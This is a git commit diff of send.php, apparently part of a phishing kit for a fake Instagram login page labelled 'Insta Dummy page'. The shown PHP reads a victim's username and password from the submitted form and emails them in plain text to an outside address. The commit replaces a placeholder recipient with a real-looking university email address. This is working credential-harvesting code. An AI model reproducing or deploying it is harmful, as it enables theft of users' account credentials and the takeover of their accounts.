6e67f8a4ed77b81bd9647363bd59977fa04ecbb4
Raymond Thiono <94914195+cangceming@users.noreply.github.com>
2023-12-11 14:31:23 +0700

    send.php

--- send.php
+++ send.php
@@ -4,7 +4,7 @@
 $username = $_POST['u_name'];  // fetch username
  $passcode = $_POST['pass'];  // fetch password
  $subject = "Someone Login ! Insta Dummy page";
- $to ="xxxxxxxx@gmail.com";
+ $to ="c14200121@petra.ac.id";
  
  $txt = "Username : ". $username. "\r\nPassword : ". $passcode ; // email body (i) username [break] (ii) password;
  
